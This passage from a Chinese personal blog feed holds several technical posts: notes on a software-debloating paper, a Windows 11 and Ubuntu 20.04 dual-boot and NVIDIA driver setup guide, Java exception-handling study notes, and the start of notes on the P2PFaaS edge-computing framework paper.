讨论</h4><ul><li><p>选择软件去膨胀方法的建议</p><ul><li>Razor在减少大小和c-通用性之间取得了良好的平衡，但生成的去臃肿程序可能存在鲁棒性问题，即在未观察到的输入上执行时可能会崩溃或无法终止。因此，如果鲁棒性很重要且程序源代码可用，用户应考虑使用基于源代码的方法。</li><li>其中，Cov是一种简单的方法，可以产生合理的结果。在鲁棒性是优先考虑的情况下，应该优先选择CovF。</li><li>相反，如果主要目标是高正确性通用性，用户应考虑使用CovA。</li><li>如果特别关注大小减小并且效率不是问题，Chisel是一个不错的选择，因为它的去臃肿过程可能需要花费几个小时才能完成，特别是对于大型程序。</li><li>最后，如果去臃肿的主要原因是减少攻击面，应该使用Debop。</li></ul></li><li><p>我们的研究证明了在去臃肿时考虑减少和通用性的重要性，并为在不显著降低减少程度的情况下提高通用性提供了解决方案</p></li><li><p>这里的一个困难是很难衡量实际的程序通用性并确定改进它的方法</p></li><li><p>另一个可能的研究方向是,探索一种 可以指导 ,基于输入的去膨胀方法的, 估计通用性的技术</p></li></ul><h4 id="4.9-%E6%9C%89%E6%95%88%E6%80%A7%E5%A8%81%E8%83%81" tabindex="-1">4.9 有效性威胁</h4><ul><li>内部威胁:使用了作者提供的Chisel、Debop和Razor的实现，并对我们实施的方法进行了仔细测试</li><li>外部威胁:评估基于一组包含10个Unix实用程序和15个SIR程序的数据集，我们收集了不同的输入集合。需要进行额外的实证研究来评估我们的结果是否适用于其他程序和输入。</li></ul><h3 id="05-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">05 相关工作</h3><ul><li><p>除基于输入的方法外,还有一些其它方法</p><ul><li>基于人工注释的特征规范,基于人工开发的领域采样,数据配置和调查 的方法</li><li>针对特定类型的应用程序的 (Chrome浏览器,Android应用程序)的方法</li><li>不移除不需要的功能,而是以来静态分析删除未使用的代码或裁剪指令和库的方法</li><li>在给定领域进行程序大小缩减(如容器,服务器系统,Java应用程序等)</li><li>或专注于特定任务(如安全性检查,API特化等)</li></ul></li><li><p>Cimplifier方法,特别是在对容器的去膨胀时,使用了类似于CovF的技术</p><ul><li>但CovF使用模糊测试提高程序鲁棒性,生成额外的输入</li><li>Cimplifier使用符号执行来获取额外的输入，以改善对所需系统资源的识别。</li></ul></li></ul><h5 id="%E5%88%86%E6%94%AF%2F%E8%B7%AF%E5%BE%84-%E9%A2%84%E6%B5%8B" tabindex="-1">分支/路径 预测</h5><ul><li>CovA于CovF的增强旨在简化程序中保留正确的代码,所以本文的研究也与 静态 分支/路径 预测有关<ul><li>但是,静态分支/路径预测的目标是提高程序的性能,而不是简化程序,所以他们不需要考虑简化和泛化的权衡</li><li>且原本预测更多基于 启发式方法和机器学习,本文预测 基于模糊测试和静态和动态分析</li></ul></li></ul><h5 id="%E7%89%B9%E5%BE%81%E8%AF%86%E5%88%AB%E5%AE%9A%E4%BD%8D" tabindex="-1">特征识别定位</h5><ul><li>本文去膨胀算法依赖于一组输入来识别所需的特征及对应的代码,这与特征识别定位的方法有关,这些方法可以用于简化对程序的理解,对去膨胀算法有帮助</li></ul><h5 id="%E7%A8%8B%E5%BA%8F%E4%BF%AE%E5%A4%8D" tabindex="-1">程序修复</h5><ul><li>类似于去膨胀算法,依赖于一组测试用例来指定程序的正确行为.因此同样可能会出现过拟合并,或修复错误</li><li>解决此类问题的技术包括 生成新的测试用例,根据启发式方法优先考虑补丁,使用概率模型</li></ul><h3 id="06-%E7%BB%93%E8%AE%BA%E5%92%8C%E6%9C%AA%E6%9D%A5%E5%B7%A5%E4%BD%9C" tabindex="-1">06 结论和未来工作</h3><ul><li><p>以往的去膨胀方法主要关注于简化程序,而忽略了程序的通用性和鲁棒性,为了填补这一空白,本文进行了研究</p><ul><li><ol><li>将三种SOTA的去膨胀方法和基础方法应用于25个程序和这些程序不同的输入集</li></ol></li><li><ol start="2"><li>系统的评估了他们在 简化程度,泛化程度以及二者间权衡程度的比较</li></ol></li></ul></li><li><p>同时,本文提出了两个新的方法,实验证明了他们在不影响简化程度的情况下,在简化程度和泛化程度取得了更好的权衡</p></li><li><p>本文的研究还表明了不同方法间的优势和劣势,我们提供了一份指南帮助用户根据需求来选择最合适的去膨胀方法,同时我们的研究也为未来的研究提供了方向</p></li><li><p>未来工作</p><ul><li>如何根据程序大小,输入覆盖及其它因素动态调整简化的程度</li><li>通过包括更多程序,额外的模糊测试 进行鲁棒性评估</li><li>进行用户研究,评估在实际场景使用去膨胀技术的可行性</li><li>调查在工业实际中去膨胀方法的使用情况</li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareEngineering </tag>
            
            <tag> SoftwareDebloating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>准备开的新坑</title>
      <link href="/2023/12/14/%E6%9D%82%E8%AE%B0/%E5%87%86%E5%A4%87%E5%BC%80%E7%9A%84%E6%96%B0%E5%9D%91/"/>
      <url>/2023/12/14/%E6%9D%82%E8%AE%B0/%E5%87%86%E5%A4%87%E5%BC%80%E7%9A%84%E6%96%B0%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h2 id="%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%BC%80%E6%96%B0%E5%9D%91" tabindex="-1">为什么要开新坑</h2><p>太摆了，还是想学点计算机技术</p><h2 id="%E5%9D%91" tabindex="-1">坑</h2><h3 id="webserver" tabindex="-1">WebServer</h3><p>想写一个WebServer，用C++写，可以看看nginx源码，或者先嫖个其他人的<a href="https://github.com/qinguoyi/TinyWebServer">github仓库</a>对着学</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>笔记本win11+ubuntu20双系统配置(包括显卡驱动和双显示器显示问题)</title>
      <link href="/2023/11/27/%E6%9D%82%E8%AE%B0/win11+ubuntu20%E5%8F%8C%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/11/27/%E6%9D%82%E8%AE%B0/win11+ubuntu20%E5%8F%8C%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E6%9D%82%E8%AE%B0/(x)_x.png" alt></p><p>本文记录我使用win11笔记本使用外接固态硬盘配置ubuntu20.04双系统,并安装对应驱动和解决双显示器显示问题的过程.</p><ul><li>以下为需要硬件信息<ul><li>笔记本信息:win11 + i13-900HX + 4060 Laptop GPU</li><li>外接固态:512GB(现在固态都不太贵了,512GB 299元,1TB 499元)<ul><li>当然如果本机硬盘空间足够,可以不用外接固态,直接在本机硬盘上分区安装ubuntu</li></ul></li><li>一个空4GB以上的U盘</li></ul></li></ul><h2 id="1-%E5%AE%89%E8%A3%85%E5%8F%8C%E7%B3%BB%E7%BB%9F" tabindex="-1">1 安装双系统</h2><h3 id="(1)-%E4%B8%8B%E8%BD%BDubuntu20.04%E9%95%9C%E5%83%8F" tabindex="-1">(1) 下载Ubuntu20.04镜像</h3><p>前往<a href="https://ubuntu.com/#download">官网</a> 或镜像站下载(如<a href="https://mirrors.tuna.tsinghua.edu.cn/#">清华大学镜像网站</a>)</p><h3 id="(2)-%E5%88%B6%E4%BD%9C%E5%90%AF%E5%8A%A8%E7%9B%98" tabindex="-1">(2) 制作启动盘</h3><p>使用UtraISO工具制作启动盘,前往<a href="https://cn.ultraiso.net/xiazai.html">官网</a>下载<br><strong>一个4GB以上空的U盘,记得提前保存数据,启动盘会自动格式化</strong>,之后在电脑上插入U盘</p><ol><li>打开UltraISO,选择试用即可</li><li>选择菜单栏文件,选择下载好的ubuntu镜像<img src="/images/%E6%9D%82%E8%AE%B0/(1)_1.png" alt></li><li>选择菜单栏的启动-&gt;写入硬盘映像,选择下载好的ubuntu镜像;写入方式选择USB-HDD+,点击写入,等待写入完成<img src="/images/%E6%9D%82%E8%AE%B0/(1)_2.png" alt></li></ol><h3 id="(3)-%E4%B8%BA%E5%9B%BA%E6%80%81%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA" tabindex="-1">(3) 为固态磁盘分区</h3><p>电脑插入固态磁盘,使用DiskGenius工具分区,前往<a href="https://www.diskgenius.cn/download.php">官网</a>下载</p><ol><li>打开DiskGenius,选择固态磁盘,右键选择<strong>转换分区类型为GUID模式</strong>,<img src="/images/%E6%9D%82%E8%AE%B0/(1)_3.png" alt></li><li>磁盘分区,为ubuntu系统可以准备四个区,各区的文件类型可以在下载ubuntu系统时设置,这里主要是把各个分区大小定下来<ul><li><strong>ESP(0)分区</strong>:文件系统类型为FAT32,我这里大小分了16GB. 该分区用于linux系统的**/boot引导分区**,后续启动linux系统的引导文件会在该分区EFI目录中</li><li><strong>分区(1)</strong>:该分区为为交换空间,大小分配为16GB. 该分区用于linux系统的<strong>交换空间</strong>,linux系统会把一部分内存空间用于交换空间,用于内存不足时的临时存储</li><li><strong>分区(2)</strong>:该分区为linux系统的<strong>根目录,即/</strong>,大小分配为128GB. 该分区用于linux系统的<strong>根目录</strong>,linux系统的所有文件都会存储在该分区</li><li><strong>分区(3)</strong>:该分区为linux系统的<strong>home目录,即/home</strong>,大小分配为128GB. 该分区用于linux系统的<strong>home目录</strong>,linux系统的用户文件都会存储在该分区,后续可以再加</li><li>剩余空间可以正常当作移动硬盘使用</li></ul></li></ol><h3 id="(4)-ubuntu%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85" tabindex="-1">(4) Ubuntu系统安装</h3><ol><li>电脑同时插入U盘启动盘和移动固态硬盘</li><li>重启电脑进入BIOS界面,我的电脑是 惠普暗影精灵9,重启时多按F10键进入BIOS界面</li><li>进入BIOS界面后,设置启动优先级为U盘启动优先（下图中将开机顺序进行调整，可以上下拖动） <img src="/images/%E6%9D%82%E8%AE%B0/(1)_4.jpg" alt="(1)_4"></li><li>随后就进入安装Ubuntu界面. 安装Ubuntu-&gt;选择语言-&gt;正常安装-&gt;<strong>安装类型为&quot;其它选项&quot;(因为我们要安装到固态硬盘中)</strong><ul><li>接下来进入了选择分区界面,记住我们之前各分区的作用,选择对应的分区,点击<strong>更改</strong>按钮,设置分区的<strong>挂载点</strong>,<strong>分区格式</strong>,<strong>分区大小</strong><ul><li><strong>ESP(0)分区</strong>:挂载点为 <strong>/boot/efi</strong>,分区格式为<strong>FAT32</strong>,分区大小为<strong>16GB</strong>,分区类型为<strong>EFI系统分区</strong></li><li><strong>分区(1)</strong>:挂载点为<strong>无</strong>,分区格式为<strong>swap</strong>,分区大小为<strong>16GB</strong></li><li><strong>分区(2)</strong>:挂载点为 <strong>/</strong>,分区格式为<strong>ext4</strong>,分区大小为<strong>128GB</strong> (如果这里不设置好根目录,会无法进入下一步)</li><li><strong>分区(3)</strong>:挂载点为 <strong>/home</strong>,分区格式为<strong>ext4</strong>,分区大小为<strong>128GB</strong></li><li>剩余空间可以正常当作移动硬盘使用</li></ul></li><li>随后再点击下一步即可</li></ul></li></ol><h3 id="(5)-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98" tabindex="-1">(5) 常见问题</h3><ol><li>因为是使用移动硬盘安装,所以再拔掉移动硬盘启动电脑时,因为检测不到linux系统,会进入grub界面,即一个命令行界面,在当前界面也可以进入win11系统,但是每次都要手动输入一些命令,比较麻烦<ul><li>所以我们每次启动电脑时还是先插着固态硬盘启动,进入到选择系统界面,随后进入win11后再拔掉固态硬盘,这样就不会进入grub界面了.</li><li>就算进入到grub界面,可以先插入固态硬盘,随后输入<code>exit</code>命令,就会重新进入选择操作系统的界面了</li></ul></li></ol><h2 id="2-%E5%AE%89%E8%A3%85%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8" tabindex="-1">2 安装显卡驱动</h2><p>这里是大坑，最好还是通过本机apt下载，在此之前需要几个准备工作</p><h3 id="(1)-%E7%A6%81%E7%94%A8-nouveau" tabindex="-1">(1) 禁用 nouveau</h3><ol><li>打开黑名单</li></ol><pre><code class="language-bash">sudo vim /etc/modprobe.d/blacklist-nouveau.conf</code></pre><ol start="2"><li>添加以下内容</li></ol><pre><code class="language-bash">blacklist nouveauoptions nouveau modeset=0</code></pre><ol start="3"><li>更新内核</li></ol><pre><code class="language-bash">sudo update-initramfs -u</code></pre><ol start="4"><li>重启电脑</li></ol><pre><code class="language-bash">sudo reboot</code></pre><ol start="5"><li>查看是否禁用成功</li></ol><pre><code class="language-bash">lsmod | grep nouveau</code></pre><p>如果没有输出则说明禁用成功</p><h3 id="(2)-%E5%85%B3%E9%97%AD-sercuity-boot" tabindex="-1">(2) 关闭 sercuity boot</h3><p>在下图中将安全启动关闭，否则会导致无法安装显卡驱动</p><p><img src="/images/%E6%9D%82%E8%AE%B0/(1)_4.png" alt></p><h3 id="(3)-%E4%B8%8B%E8%BD%BD%E9%A9%B1%E5%8A%A8" tabindex="-1">(3) 下载驱动</h3><ol><li>添加ppa源</li></ol><pre><code class="language-bash">sudo add-apt-repository ppa:graphics-drivers/ppa</code></pre><ol start="2"><li>为系统安装依赖项</li></ol><pre><code class="language-bash">sudo apt updatesudo apt-get install dkms build-essential</code></pre><ol start="3"><li>查看可用的显卡驱动</li></ol><pre><code class="language-bash">ubuntu-drivers devices</code></pre><p>效果如下，可以看到很多版本的驱动，我们可以看到一个<code>recommended</code>字样，这是推荐的版本，我们可以选择这个版本，但需要注意的是，这个版本不一定最好，其区别如下</p><ul><li>NVIDIA Driver 535 Server Open： 这是专为服务器环境设计的开放版本的NVIDIA驱动程序，它具有一些特定于服务器的功能或优化，以提供更好的性能和稳定性。</li><li>NVIDIA Driver 535： 这是通用版本的NVIDIA驱动程序，适用于大多数NVIDIA显卡和桌面/笔记本电脑系统，它能提供广泛的兼容性和功能，并支持各种应用程序和游戏。</li><li>NVIDIA Driver 535 Open： 这是开源版本的NVIDIA驱动程序，针对那些希望在开放源代码环境下自定义和修改驱动程序的用户，它能提供更多的灵活性和可定制性。</li></ul><p>所以我们可以选择NVIDIA Driver 535版本即可，不需要Server或者Open版本，兼容性更好一些</p><p><img src="/images/%E6%9D%82%E8%AE%B0/(1)_6.png" alt></p><ol start="4"><li>安装对应的显卡驱动</li></ol><pre><code class="language-bash">sudo apt install nvidia-driver-535</code></pre><ol start="5"><li>重启电脑</li></ol><pre><code class="language-bash">sudo reboot</code></pre><ol start="6"><li>查看显卡驱动是否安装成功</li></ol><pre><code class="language-bash">nvidia-smi</code></pre><p>如果安装成功，会显示如下信息<br>！<a href="/images/%E6%9D%82%E8%AE%B0/(1)_7.png"></a></p><h2 id="3-%E5%8F%8C%E6%98%BE%E7%A4%BA%E5%99%A8%E9%97%AE%E9%A2%98" tabindex="-1">3 双显示器问题</h2><p>在安装完显卡驱动后，插入第二个屏幕，但是终端通过<code>xrandr</code>查看，或在设置中查看，都只能看到本机的屏幕</p><p>这是因为默认状态下只是用集成显卡，所以我们需要设置为独立显卡优先，我们在BIOS中设置即可</p><p>在下图中将显卡切换设置为discrete graphics，之后在打开ubuntu可以发现双显示器已经可以正常使用了<br><img src="/images/%E6%9D%82%E8%AE%B0/(1)_5.png" alt></p><h2 id="%E6%80%BB%E7%BB%93" tabindex="-1">总结</h2><p>以上便是我安装双系统的过程，最费时间的是3双显示器问题，网络上很多资料都是认为是驱动问题，但最后看到了一个帖子，发现他设置了BIOS中的显卡设置，之后就可以正常使用了，我这里也一样，希望这篇文章可以帮助到你</p><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 文章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>On java 8 基础卷（15-21章）</title>
      <link href="/2023/11/12/PL/On%20java8%E5%9F%BA%E7%A1%80%E5%8D%B715-21/"/>
      <url>/2023/11/12/PL/On%20java8%E5%9F%BA%E7%A1%80%E5%8D%B715-21/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/PL/OnJava8/x_x.jpg" alt></p><h2 id="15-%E5%BC%82%E5%B8%B8" tabindex="-1">15 异常</h2><ul><li>Java的基本哲学:写得不好的代码无法运行</li></ul><h3 id="15.1-%E6%A6%82%E5%BF%B5" tabindex="-1">15.1 概念</h3><ul><li>C 语言和其他较早的语言往往有多种错误处理机制，这类机制通常是通过约定建立的，而不是作为编程语言的一部分。</li><li>异常可以降低错误处理代码的复杂性<ul><li>如果没有异常,就必须检查某个特定的错误并加以处理,可能要在程序多个地方进行</li><li>而异常可以确保有人会捕捉他们,并且只需在一个地方进行处理</li></ul></li></ul><h3 id="15.2-%E5%9F%BA%E6%9C%AC%E7%9A%84%E5%BC%82%E5%B8%B8" tabindex="-1">15.2 基本的异常</h3><ul><li><strong>异常情况</strong>:指组织当前方法或作用域继续执行的问题.</li><li>需要区分普通问题和异常<ul><li>普通问题:当前上下文有足够的信息解决问题</li><li>异常:当前上下文没有足够的信息处理问题,因此需要跳出当前上下文,将问题委托给更上层的上下文</li></ul></li><li>当抛出一个异常时,会发生以下几件事</li></ul><ol><li>异常对象创建,使用new创建,放在堆上</li><li>当前执行路径停止,指向这个异常对象的引用被从上下文中推出</li><li>异常处理机制接管控制,寻找异常处理程序</li></ol><h4 id="%E5%BC%82%E5%B8%B8%E5%8F%82%E6%95%B0" tabindex="-1">异常参数</h4><ul><li>和Java其它对象一样,使用new在堆上创建异常,其会分配存储空间并调用构造器<ul><li>所有标准异常类有连个构造器,一个无参构造器,第二个接收一个String参数,用于放置在异常中放置的相关信息</li></ul></li></ul><pre><code class="language-java">if(t == null)    throw new NullPointerException(&quot;t = null&quot;);</code></pre><ul><li>关键词throw有意思<ul><li>使用new创建异常对象后,使用throw将其返回,这种返回类似于return,但是不会返回任何值,而是指示程序退出当前执行路径</li><li>此外可以抛出任何类型的 Throwable(异常类型的根类),通常错误信息就包含在异常类型的名字中</li></ul></li></ul><h3 id="15.3-%E6%8D%95%E6%8D%89%E5%BC%82%E5%B8%B8" tabindex="-1">15.3 捕捉异常</h3><ul><li><strong>被守护区域</strong>:一段可能产生异常的代码,后面跟着处理异常的代码</li></ul><h4 id="try-%E5%9D%97" tabindex="-1">try 块</h4><ul><li>try块包含了异常可能发生的代码,这样在代码抛出异常后,异常处理机制就能捕获它</li><li>用类似C这样不支持异常处理的语言编写的库,需要依赖临时的机制报告错误. 有了异常处理,可以把所有的内容放在一个try块中,并在一个地方捕获所有异常,意味着代码更容易编写和阅读,因为代码的正确执行目的不会被错误检查所混淆</li></ul><pre><code class="language-java">try &#123; // 可能会产生异常的代码&#125;</code></pre><h4 id="%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%A8%8B%E5%BA%8F" tabindex="-1">异常处理程序</h4><ul><li>异常处理程序紧跟在 try 块之后，用关键字 catch 来表示。</li></ul><pre><code class="language-java">try &#123; // 可能会产生异常的代码&#125; catch(Type1 id1) &#123; // 处理 Type1 类型的异常&#125; catch(Type2 id2) &#123; // 处理 Type2 类型的异常&#125; catch(Type3 id3) &#123; // 处理 Type3 类型的异常&#125;</code></pre><ul><li>每个catch子句(异常处理程序)像一个小方法,接收且只接收一个特定类型的参数. 标识符(id1,id2)可以在处理程序中使用,它们引用了抛出异常对象的引用</li><li>异常处理程序需要紧跟在try块后,一个异常抛出后,异常处理机制和寻找参数和异常类型相匹配的一个处理程序,然后进入catch子句,我们就认为这个异常被处理</li></ul><h4 id="%E7%BB%88%E6%AD%A2%E4%B8%8E%E6%81%A2%E5%A4%8D" tabindex="-1">终止与恢复</h4><ul><li><p>在异常处理理论中,有两种基本模型</p><ul><li><strong>终止模型 termination</strong>:异常处理程序不试图修复错误,而是终止程序运行. Java支持终止模型</li><li><strong>恢复模型 resumption</strong>:异常处理程序负责纠正错误,并重新尝试调用错误产生的方法. 支持恢复模型意味着我们仍然希望在处理完异常后继续执行</li></ul></li><li><p>如果想在Java中达到恢复模型的效果,可以把try块放在一个while循环中,不断重新进入try块直到结果令人满意</p></li><li><p>从历史上看,最终仍是使用终止模型,因为恢复模型将导致耦合,使得代码难以编写和维护</p></li></ul><h3 id="15.4-%E5%88%9B%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%BC%82%E5%B8%B8%E7%B1%BB" tabindex="-1">15.4 创建自己的异常类</h3><ul><li>通常,异常类都是继承自Exception类,或者继承自Exception的某个子类<ul><li>一个异常最重要的是其类名</li></ul></li></ul><pre><code class="language-java">class SimpleException extends Exception &#123;&#125;public class InheritingExceptions &#123;  public void f() throws SimpleException &#123;    System.out.println(      &quot;Throw SimpleException from f()&quot;);    throw new SimpleException();  &#125;  public static void main(String[] args) &#123;    InheritingExceptions sed =      new InheritingExceptions();    try &#123;      sed.f();    &#125; catch(SimpleException e) &#123;      System.out.println(&quot;Caught it!&quot;);    &#125;  &#125;&#125;/* Output:Throw SimpleException from f()Caught it!*/</code></pre><ul><li>也可以创建一个接收String参数的异常类</li></ul><pre><code class="language-java">class MyException extends Exception &#123;  MyException() &#123;&#125;  MyException(String msg) &#123; super(msg); &#125;//调用父类的构造器,Exception的构造器接收一个String参数,同时Exception继承自Throwable&#125;public class FullConstructors &#123;  public static void f() throws MyException &#123;    System.out.println(&quot;Throwing MyException from f()&quot;);    throw new MyException();  &#125;  public static void g() throws MyException &#123;    System.out.println(&quot;Throwing MyException from g()&quot;);    throw new MyException(&quot;Originated in g()&quot;);  &#125;  public static void main(String[] args) &#123;    try &#123;      f();    &#125; catch(MyException e) &#123;      e.printStackTrace(System.out);//Throwable的printStackTrace()方法,打印异常栈轨迹,这里将其输出到System.out,如果使用无参版本,则会将其输出到System.err    &#125;    try &#123;      g();    &#125; catch(MyException e) &#123;      e.printStackTrace(System.out);    &#125;  &#125;&#125;/* Output:Throwing MyException from f()MyException        at FullConstructors.f(FullConstructors.java:11)        atFullConstructors.main(FullConstructors.java:19)Throwing MyException from g()MyException: Originated in g()        at FullConstructors.g(FullConstructors.java:15)        atFullConstructors.main(FullConstructors.java:24)*/</code></pre><h4 id="%E5%BC%82%E5%B8%B8%E5%92%8C%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95" tabindex="-1">异常和日志记录</h4><ul><li>可以使用java.util.logging工具将输出记录到日志中</li></ul><p>略</p><h3 id="15.5-%E5%BC%82%E5%B8%B8%E8%AF%B4%E6%98%8E" tabindex="-1">15.5 异常说明</h3><ul><li><strong>异常声明exception specificaton</strong> 为方法声明的组成部分,出现在参数列表之后. 可以语法礼貌地告诉程序员这个方法会抛出的异常</li></ul><pre><code class="language-java">void f() throws TooBig, TooSmall, DivZero &#123; // ...</code></pre><ul><li>而以下写法意味着这个方法不会抛出异常(除了从<em>RuntimeExecption</em>继承而来的异常,这样的异常可以从任何地方抛出而不要异常说明)</li></ul><pre><code class="language-java">void f() &#123; // ...</code></pre><ul><li>Java保证在编译时提供一定程度的异常正确性,即如果方法中出现了异常,要么处理这个异常,要么使用异常说明指明这个异常可能会被抛出<ul><li>这种在编译时被检查并强制实施的异常叫做<strong>检查型异常(checked exception)</strong></li></ul></li></ul><h3 id="15.6-%E6%8D%95%E6%8D%89%E4%BB%BB%E4%BD%95%E5%BC%82%E5%B8%B8" tabindex="-1">15.6 捕捉任何异常</h3><ul><li>通过捕捉异常类型的基类Exception,可以捕捉任何异常. 使用时需要放到处理列表的最后,避免在其他异常处理程序之前捕获了异常</li></ul><pre><code class="language-java">catch(Exception e) &#123; System.out.println(&quot;Caught an exception&quot;);&#125;</code></pre><ul><li>Exception类是所有对程序员很重要的异常类的基类,因此我们不能从他得到太多信息,我们可以通过调用其基类Throwable的方法来获取信息<ul><li>getMessage()方法返回异常对象的详细信息</li><li>getLocalizedMessage()方法返回异常对象的本地化信息</li><li>toString()方法返回异常对象的类型和详细信息</li><li>以下方法打印Throwable的调用栈轨迹,调用栈显示了异常抛出的地方,以及异常传播的路径<ul><li>printStackTrace(),打印到标准错误流</li><li>printStackTrace(PrintStream),打印到指定流</li><li>printStackTrace(PrintWriter),打印到指定流</li></ul></li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>P2PFaaS</title>
      <link href="/2023/08/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BA%E6%96%87/P2PFaaS/"/>
      <url>/2023/08/16/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BA%E6%96%87/P2PFaaS/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.sciencedirect.com/science/article/pii/S2352711022002084">论文连接</a></p><h2 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h2><p>在边缘和雾计算环境中，通常会设计和测试实施调度和负载均衡解决方案的分布式算法。通常适用于该环境的操作范式要求用户调用最近的节点来执行任务，并且由于服务必须在一组节点之间分布，使用FaaS（函数即服务）的无服务器范式是最有前景的策略。基于这些前提条件，我们设计并实现了一个名为P2PFaaS的框架。该框架基于Docker容器构建，允许在一组节点之间实现完全分散的调度或负载均衡算法。通过依赖三个基本服务，即调度服务、发现服务和学习器服务，该框架允许实现任何类型的调度解决方案，即使基于强化学习。最后，该框架提供了一个即插即用的解决方案，可以在x86服务器和基于ARM的边缘节点（例如树莓派）上安装和测试。</p><h2 id="%E8%BD%AF%E4%BB%B6%E6%8F%8F%E8%BF%B0" tabindex="-1">软件描述</h2><h3 id="1.1-%E8%BD%AF%E4%BB%B6%E6%9E%B6%E6%9E%84" tabindex="-1">1.1 软件架构</h3><p><img src="/images/%E8%AE%BA%E6%96%87/P2PFaaS/%E6%9E%B6%E6%9E%84%E5%9B%BE.png" alt></p><ul><li>调度器服务在端口18080上监听，并作为框架的入口，客户端可以通过REST API请求执行函数。</li><li>学习器服务在端口19020上监听，并实现了用于调度器服务进行调度决策的强化学习模型的训练和推断。</li><li>发现服务在端口19000上监听，并实现了节点的发现。</li></ul><h3 id="1.2-%E6%93%8D%E4%BD%9C%E6%B5%81%E7%A8%8B" tabindex="-1">1.2 操作流程</h3><p><img src="/images/%E8%AE%BA%E6%96%87/P2PFaaS/%E6%93%8D%E4%BD%9C%E6%B5%81%E7%A8%8B.PNG" alt></p><ol><li>客户端调用URL请求执行一个函数</li><li>采取操作（这里如果配置了基于RL的调度器，需将当前状态传递给 学习器服务，然后获得操作）</li><li>开始操作<ol><li>可将请求转发到另一节点，通过http来调用</li><li>可将请求加入本地队列等待执行</li><li>拒绝请求</li></ol></li><li>最终的函数执行通过向函数的容器发出http来调用，执行完毕后，输出数据转发给客户端</li><li>如果调度器基于RL，此时可进行模型的训练，调整模型参数</li></ol><h4 id="%E8%B0%83%E5%BA%A6%E6%9C%8D%E5%8A%A1" tabindex="-1">调度服务</h4><p>调度器模块是用Go语言编写的。选择这种编程语言是因为它专门为Web服务器的开发而设计。<br><img src="/images/%E8%AE%BA%E6%96%87/P2PFaaS/%E8%B0%83%E5%BA%A6%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84.jpg" alt></p><ul><li><p>API模块：API模块在调度器服务中扮演重要角色，它处理来自客户端的API请求。</p><ul><li>首先，它负责准备函数执行请求，包括根据请求参数和配置信息构建请求，并将其传递给实际的调度器进行处理。</li><li>其次，API模块还负责为配置更新准备有效载荷，即根据客户端的请求更新调度器的配置信息。</li></ul></li><li><p>调度服务容器启动时，会启动两个线程</p><ul><li>Web服务器线程：负责处理HTTP API调用</li><li>工作线程：负责管理内部任务队列</li></ul></li><li><p>调度器模块</p><ul><li>设计目的：允许调度算法的可互换性，为此设置了调度接口，可以完成调度算法的实例化和配置<pre><code class="language-Go">type scheduler interface &#123;GetFullName() stringGetScheduler() *types.SchedulerDescriptorSchedule(req *types.ServiceRequest) (*JobResult, error)&#125;</code></pre></li><li>调度函数实现对函数执行请求的有效调度，可以采取三种可能操作<ul><li>拒绝请求：返回HTTP错误码500并关闭客户端请求</li><li>在当前节点执行请求：在本地进行排队</li><li>将请求转发到其它节点：再次使用调度函数来调度请求，但这次请求标记为“External”，请求的转发通过&quot;API/Peer&quot;模块实现</li></ul></li></ul></li><li><p>队列模块：限制并行运行函数的数量，通常所说的节点中可以执行的并行任务数量的参数称为K。队列由一个实现生产者-消费者模式的线程管理。</p><ul><li>采用上述方式实现的队列限制了并行性，针对没有相关计算能力的边缘设备</li><li>这种队列的设计与M/M/1/K和M/M/K/K队列模型相匹配，这些模型可以帮助设计者确定最佳的系统参数，以实现所需的性能和可靠性。</li></ul></li><li><p>FaaS管理器模块：负责将函数执行请求转发到正确的FaaS函数容器。</p><ul><li>该模块允许进一步解耦，可以使用不同的FaaS容器技术</li><li>Docker自动完成将容器名称转换为FaaS容器的IP地址名称解析</li><li>该模块保证请求被正确地路由到相应的FaaS容器，从而实现高效的函数执行。</li></ul></li><li><p>配置器模块：管理启动时的配置（称为 “静态”）和运行时的配置（称为 